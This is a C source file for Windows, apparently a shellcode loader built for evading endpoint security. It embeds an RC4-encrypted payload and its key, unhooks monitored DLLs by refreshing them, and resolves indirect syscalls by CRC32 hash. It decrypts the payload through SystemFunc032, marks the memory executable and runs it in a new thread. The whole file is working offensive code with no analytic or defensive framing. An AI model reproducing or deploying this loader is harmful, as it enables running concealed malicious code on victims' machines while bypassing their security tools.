#include <Windows.h>
#include "Common.h"
#include "Debug.h"

UCHAR ProtectedKey[] = { 0x42, 0x95, 0xCA, 0x94, 0xBB, 0xED, 0x81, 0x24, 0x93, 0xD2, 0x5A, 0x1D, 0x78, 0x5D, 0x85, 0x9C };

UCHAR Payload[] = {
		0x54, 0xFF, 0xE1, 0x8C, 0x49, 0x50, 0xD6, 0x58, 0x57, 0x2A, 0xAC, 0xE1, 0xD6, 0x9B, 0x9E, 0xFB,
		0xAB, 0x27, 0xA7, 0x78, 0x9C, 0x50, 0x61, 0x6E, 0x44, 0x78, 0xBC, 0xD9, 0xF2, 0xA3, 0x28, 0xEA,
		0xB2, 0x67, 0xAF, 0xA2, 0xF3, 0xF1, 0xBA, 0xC0, 0x8E, 0xCE, 0xCF, 0xCB, 0x57, 0xC5, 0x46, 0x0B,
		0xA7, 0x1C, 0x8E, 0xBD, 0x69, 0xD2, 0x7D, 0x2E, 0x4D, 0x5D, 0x7B, 0x37, 0x42, 0xFF, 0x44, 0x0E,
		0x76, 0xEE, 0x1F, 0xA0, 0x58, 0x7A, 0xCB, 0xA8, 0x5B, 0x22, 0xDB, 0x1C, 0xA7, 0x09, 0xD8, 0x90,
		0x5E, 0x59, 0x1F, 0x9A, 0x68, 0x26, 0xFD, 0xB7, 0x2D, 0xEF, 0xEA, 0x2E, 0x25, 0x21, 0x05, 0x02,
		0x2E, 0xF5, 0x8B, 0x41, 0x8C, 0x5A, 0x6D, 0xC9, 0x94, 0xE8, 0x58, 0xA0, 0xFB, 0x7F, 0x78, 0x57,
		0x0C, 0xAF, 0xFC, 0x8E, 0x04, 0xDA, 0x9F, 0x1E, 0x3E, 0xEC, 0xF8, 0x3F, 0xFB, 0xD8, 0xA6, 0x26,
		0x82, 0x0C, 0xA9, 0xDE, 0x8A, 0x0F, 0xAD, 0x6D, 0x18, 0x87, 0x3F, 0xCC, 0xAC, 0xD6, 0xE8, 0x21,
		0xD7, 0x15, 0x2C, 0xDC, 0x8D, 0xF3, 0x63, 0x7B, 0x5E, 0x90, 0x2E, 0x6E, 0xCF, 0xC4, 0x86, 0xBF,
		0xC7, 0x20, 0xC0, 0x1F, 0x95, 0xA0, 0x4A, 0x95, 0x0C, 0xB5, 0x27, 0xFD, 0x31, 0xF7, 0xB7, 0x4B,
		0x3D, 0xD5, 0x12, 0x3E, 0xF2, 0xD0, 0xD3, 0xE5, 0xD8, 0x8E, 0x84, 0x78, 0x72, 0x85, 0x24, 0x64,
		0x38, 0xEF, 0x4F, 0x76, 0xB2, 0x1C, 0x78, 0x6D, 0xEA, 0xB6, 0x4D, 0x9F, 0xDC, 0x9D, 0xD6, 0xC8,
		0x6E, 0xBD, 0xC7, 0x95, 0x35, 0xA6, 0x82, 0xA7, 0xDF, 0xB8, 0xD3, 0x3C, 0xED, 0x0E, 0x9B, 0xC9,
		0xE4, 0xF0, 0x5A, 0xDE, 0x66, 0x40, 0x8C, 0x8A, 0x26, 0xC8, 0xDE, 0xE6, 0x00, 0x9C, 0xCA, 0x01,
		0x75, 0xE0, 0x8C, 0x6A, 0xBC, 0xF7, 0x7F, 0xED, 0x97, 0x80, 0xE6, 0xC6, 0x87, 0x20, 0xFA, 0xA2,
		0xCD, 0xCD, 0x63, 0x84, 0x4F, 0x21, 0x74, 0x91, 0xA0, 0xD0, 0x1B, 0x12, 0xD7, 0x6F, 0x73, 0x32
};

// global variable
NTAPI_FUNC g_Nt = { 0 };

BOOL InitializeNtSyscalls() {

	if (!FetchNtSyscall(NtAllocateVirtualMemory_CRC32, &g_Nt.NtAllocateVirtualMemory)) {
#ifdef DEBUG
		PRINTA("[!] Failed In Obtaining The Syscall Number Of NtAllocateVirtualMemory \n");
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] Syscall Number Of NtAllocateVirtualMemory Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtAllocateVirtualMemory.dwSSn, g_Nt.NtAllocateVirtualMemory.pSyscallInstAddress);
#endif

	if (!FetchNtSyscall(NtProtectVirtualMemory_CRC32, &g_Nt.NtProtectVirtualMemory)) {
#ifdef DEBUG
		PRINTA("[!] Failed In Obtaining The Syscall Number Of NtProtectVirtualMemory \n");
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] Syscall Number Of NtProtectVirtualMemory Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtProtectVirtualMemory.dwSSn, g_Nt.NtProtectVirtualMemory.pSyscallInstAddress);
#endif

	if (!FetchNtSyscall(NtCreateThreadEx_CRC32, &g_Nt.NtCreateThreadEx)) {
#ifdef DEBUG
		PRINTA("[!] Failed In Obtaining The Syscall Number Of NtCreateThreadEx \n");
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] Syscall Number Of NtCreateThreadEx Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtCreateThreadEx.dwSSn, g_Nt.NtCreateThreadEx.pSyscallInstAddress);
#endif

	if (!FetchNtSyscall(NtWaitForSingleObject_CRC32, &g_Nt.NtWaitForSingleObject)) {
#ifdef DEBUG
		PRINTA("[!] Failed In Obtaining The Syscall Number Of NtWaitForSingleObject \n");
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] Syscall Number Of NtWaitForSingleObject Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtWaitForSingleObject.dwSSn, g_Nt.NtWaitForSingleObject.pSyscallInstAddress);
#endif
	return TRUE;
}

INT main() {

	NTSTATUS	STATUS = NULL;
	PVOID		pAddress = NULL;
	SIZE_T		sSize = sizeof(Payload);
	DWORD		dwOld = NULL;
	HANDLE		hProcess = NtCurrentProcess(),	// local process
		hThread = NULL;

	// 'win32u.dll' contains the ROPs to jump to later 
	LoadLibraryH("win32u");

	if (!IniUnhookIndirectSyscalls()) {
#ifdef DEBUG
		PRINTA("[!] Failed To Initialize The Unhooking Indirect-Syscalls\n");
#endif
		return -1;
	}

	if (!IniUnhookDirectCalls()) {
#ifdef DEBUG
		PRINTA("[!] Failed To Initialize The Unhooking Direct-Syscalls\n");
#endif // DEBUG
		return -1;
	}

	if (!RefreshAllDlls()) {
#ifdef DEBUG
		PRINTA("[!] RefreshAllDlls Failed\n");
#endif // DEBUG
		return -1;
	}

	if (!InitializeNtSyscalls()) {
#ifdef DEBUG
		PRINTA("[!] Failed To Initialize The Specified Indirect-Syscalls \n");
#endif
		return -1;
	}

	Rc4EncryptionViSystemFunc032(ProtectedKey, Payload, KEY_SIZE, sizeof(Payload));

	// allocating memory
	SET_SYSCALL(g_Nt.NtAllocateVirtualMemory);
	if ((STATUS = RunSyscall(hProcess, &pAddress, 0, &sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0x00 || pAddress == NULL) {
#ifdef DEBUG
		PRINTA("[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
#endif
		return -1;
	}

	_memcpy(pAddress, Payload, sizeof(Payload));

	// changing memory protection
	SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
	if ((STATUS = RunSyscall(hProcess, &pAddress, &sSize, PAGE_EXECUTE_READ, &dwOld)) != 0x00) {
#ifdef DEBUG
		PRINTA("[!] NtProtectVirtualMemory Failed With Status : 0x%0.8X\n", STATUS);
#endif
		return -1;
	}

	// executing the payload
	SET_SYSCALL(g_Nt.NtCreateThreadEx);
	if ((STATUS = RunSyscall(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, FALSE, NULL, NULL, NULL, NULL)) != 0x00) {
#ifdef DEBUG
		PRINTA("[!] NtCreateThreadEx Failed With Status : 0x%0.8X\n", STATUS);
#endif
		return -1;
	}

	// waiting for the payload
	SET_SYSCALL(g_Nt.NtWaitForSingleObject);
	if ((STATUS = RunSyscall(hThread, FALSE, NULL)) != 0x00) {
#ifdef DEBUG
		PRINTA("[!] NtWaitForSingleObject Failed With Error: 0x%0.8X \n", STATUS);
#endif
		return -1;
	}

	return 0;
}

extern VOID* __cdecl memset(VOID*, INT, size_t);
#pragma intrinsic(memset)
#pragma function(memset)
VOID* __cdecl memset(VOID* pTarget, INT value, size_t cbTarget) {
	PUCHAR p = (PUCHAR)pTarget;
	while (cbTarget-- > 0) {
		*p++ = (UCHAR)value;
	}
	return pTarget;
}